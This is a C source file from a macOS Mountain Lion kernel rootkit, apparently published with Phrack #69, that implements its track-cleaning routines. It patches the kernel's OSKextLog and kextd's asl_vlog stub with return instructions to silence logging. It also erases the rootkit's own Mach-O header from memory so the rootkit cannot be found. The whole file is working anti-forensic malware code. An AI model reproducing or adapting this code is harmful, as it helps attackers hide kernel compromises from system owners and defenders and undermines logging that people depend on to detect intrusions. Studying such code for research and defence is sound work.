/*
 *   _____   _                          ___     _      _  _     _              __ _
 *  |_   _| | |_      ___      o O O   | __|   | |    | || |   (_)    _ _     / _` |
 *    | |   | ' \    / -_)    o        | _|    | |     \_, |   | |   | ' \    \__, |
 *   _|_|_  |_||_|   \___|   TS__[O]  _|_|_   _|_|_   _|__/   _|_|_  |_||_|   |___/
 * _|"""""|_|"""""|_|"""""| {======|_| """ |_|"""""|_| """"|_|"""""|_|"""""|_|"""""|
 * "`-0-0-'"`-0-0-'"`-0-0-'./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *            ___      _
 *    o O O  / __|    (_)      _ _    __     _  _     ___
 *   o      | (__     | |     | '_|  / _|   | +| |   (_-<
 *  TS__[O]  \___|   _|_|_   _|_|_   \__|_   \_,_|   /__/_
 *  {======|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|
 * ./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *
 * And now for something completely different...
 *
 * A Mountain Lion rootkit for Phrack #69!
 *
 * Copyright (c) fG!, 2012, 2013 - reverser@put.as - http://reverse.put.as
 * All rights reserved.
 *
 * clean_tracks.c
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include "clean_tracks.h"

#include <sys/param.h>
#include <sys/malloc.h>
#include <mach-o/loader.h>
#include <string.h>
#include <mach/task.h>

#include "cpu_protections.h"
#include "kernel_info.h"
#include "proc_utils.h"
#include "function_pointers.h"
#include "macho_utils.h"
#include "kernel_info.h"

static mach_vm_address_t find_rootkit_base(const mach_vm_address_t start_address);

// globals
extern struct kernel_info g_kernel_info;
char g_orig_kextlog_byte = 0;
mach_vm_address_t g_kextd_patch_addr = 0;

/*
 * temporarly disable OSKextLog in kernel
 * this will avoid logging the zombies rootkit error(s)
 */
kern_return_t
disable_oskextlog(void)
{
#if DEBUG
    //moony_modify//printf("[DEBUG] Executing %s\n", __FUNCTION__);
#endif
    mach_vm_address_t _OSKextLog = solve_kernel_symbol(&g_kernel_info, "_OSKextLog");
#if DEBUG
    //moony_modify//printf("[DEBUG] Symbol address is %p\n", (void*)_OSKextLog);
#endif
    if (_OSKextLog != 0)
    {
        g_orig_kextlog_byte = *(char*)_OSKextLog;
        disable_wp();
        *(char*)_OSKextLog = 0xC3;
        enable_wp();
        return KERN_SUCCESS;
    }
    else
    {
#if DEBUG
        //moony_modify//printf("[ERROR] Failed to solve OSKextLog symbol and disabling kernel logging...\n");
#endif
        return KERN_FAILURE;
    }
}

/*
 * revert above's patch to kernel
 */
kern_return_t
enable_oskextlog(void)
{
#if DEBUG
    //moony_modify//printf("[DEBUG] Executing %s\n", __FUNCTION__);
#endif
    mach_vm_address_t _OSKextLog = solve_kernel_symbol(&g_kernel_info, "_OSKextLog");
#if DEBUG
    //moony_modify//printf("[DEBUG] Symbol address is %p\n", (void*)_OSKextLog);
#endif
    if (_OSKextLog != 0)
    {
        disable_wp();
        *(char*)_OSKextLog = g_orig_kextlog_byte;
        enable_wp();
        return KERN_SUCCESS;
    }
    // hummm this might be bad if we enter this was was previously patched...
    else
    {
#if DEBUG
        //moony_modify//printf("[ERROR] Failed to solve OSKextLog symbol and enabling kernel logging...\n");
#endif
        return KERN_FAILURE;
    }    
}

/*
 * kextd will log to syslog via asl so we need to temporarly disable it
 */
kern_return_t
disable_kextd_syslog(void)
{
#if DEBUG
    //moony_modify//printf("[DEBUG] Executing %s\n", __FUNCTION__);
#endif
    if (_mach_vm_protect == NULL) _mach_vm_protect = (void*)solve_kernel_symbol(&g_kernel_info, "_mach_vm_protect");
    if (_vm_map_write_user == NULL) _vm_map_write_user = (void*)solve_kernel_symbol(&g_kernel_info, "_vm_map_write_user");
    // find the stub address we are going to patch
    g_kextd_patch_addr = find_stub_address("kextd", "_asl_vlog");
    if (g_kextd_patch_addr)
    {
        proc_t target = find_proc_by_name("kextd");
        if (target != (proc_t)0)
        {
            task_t task = target->task;
            vm_prot_t protection = VM_PROT_WRITE | VM_PROT_READ;
            mach_msg_type_number_t len = 1;
            char *patch_byte = "\xc3";
            if (_mach_vm_protect((vm_map_t)task->map, g_kextd_patch_addr, len, FALSE, protection))
            {
#if DEBUG
                //moony_modify//printf("[ERROR] vm_protect write of asl_vlog failed!\n");
#endif
            }
            if (_vm_map_write_user((vm_map_t)task->map, (void*)patch_byte, g_kextd_patch_addr, sizeof(char)))
            {
#if DEBUG
                //moony_modify//printf("[ERROR] patching asl_vlog failed!\n");
#endif
            }
            protection = VM_PROT_EXECUTE | VM_PROT_READ;
            if (_mach_vm_protect((vm_map_t)task->map, g_kextd_patch_addr, len, FALSE, protection))
            {
#if DEBUG
                //moony_modify//printf("[ERROR] vm_protect to original protections of asl_vlog failed!\n");
#endif
            }
        }
        else
        {
#if DEBUG
            //moony_modify//printf("[ERROR] Failed to find kextd proc!\n");
#endif
            return KERN_FAILURE;
        }
    }
    return KERN_SUCCESS;
}

/*
 * revert above's patch to kextd
 */
kern_return_t
enable_kextd_syslog(void)
{
#if DEBUG
    //moony_modify//printf("[DEBUG] Executing %s\n", __FUNCTION__);
#endif
    if (_mach_vm_protect == NULL) _mach_vm_protect = (void*)solve_kernel_symbol(&g_kernel_info, "_mach_vm_protect");
    if (_vm_map_write_user == NULL) _vm_map_write_user = (void*)solve_kernel_symbol(&g_kernel_info, "_vm_map_write_user");

    if (g_kextd_patch_addr)
    {
        proc_t target = find_proc_by_name("kextd");
        if (target != (proc_t)0)
        {
            task_t task = target->task;
            
            vm_prot_t protection = VM_PROT_WRITE | VM_PROT_READ;
            mach_msg_type_number_t len = 1;
            // XXX: assume original byte is FF - it's PoC, we can live with it for now :-)
            char *patch_byte = "\xFF";
            if (_mach_vm_protect((vm_map_t)task->map, g_kextd_patch_addr, len, FALSE, protection))
            {
#if DEBUG
                //moony_modify//printf("[ERROR] vm_protect write of asl_vlog failed!\n");
#endif
            }
            if (_vm_map_write_user((vm_map_t)task->map, (void*)patch_byte, g_kextd_patch_addr, sizeof(char)))
            {
#if DEBUG
                //moony_modify//printf("[ERROR] unpatching asl_vlog failed!\n");
#endif
            }
            protection = VM_PROT_EXECUTE | VM_PROT_READ;
            if (_mach_vm_protect((vm_map_t)task->map, g_kextd_patch_addr, len, FALSE, protection))
            {
#if DEBUG
                //moony_modify//printf("[ERROR] vm_protect to original protections of asl_vlog failed!\n");
#endif
            }
        }
        else
        {
#if DEBUG
            //moony_modify//printf("[ERROR] Failed to find kextd proc!\n");
#endif
            return KERN_FAILURE;
        }
    }
    return KERN_SUCCESS;
}

/*
 * find where rootkit is located and bzero its mach-o header
 */
kern_return_t
nuke_mach_header(void)
{
    mach_vm_address_t start_address = find_rootkit_base(&nuke_mach_header);
    if (start_address == 0) return KERN_FAILURE;
    struct mach_header_64 *mh = (struct mach_header_64*)start_address;
    uint32_t header_size = 0;
    if (mh->magic != MH_MAGIC_64)
    {
        return KERN_FAILURE;
    }
    header_size = mh->sizeofcmds + sizeof(struct mach_header_64);
    // we have total header size and startup address
    // so clean it up :-)
    disable_wp();
    memset((void*)start_address, 0, header_size);
    enable_wp();
    
    return KERN_SUCCESS;
}

#pragma mark Auxiliary functions

/*
 * find the kernel base address (mach-o header)
 * by searching backwards using the int80 handler as starting point
 */
static mach_vm_address_t
find_rootkit_base(const mach_vm_address_t start_address)
{
    mach_vm_address_t temp_address = start_address;
    while (temp_address > 0)
    {
        if (*(uint32_t*)(temp_address) == MH_MAGIC_64)
        {
            // do an additional test, this could be even more robust
            if (((struct mach_header_64*)temp_address)->filetype == MH_KEXT_BUNDLE)
            {
                return temp_address;
            }
        }
        // check for int overflow
        if (temp_address - 1 > temp_address) break;
        temp_address--;
    }
    return 0;
}
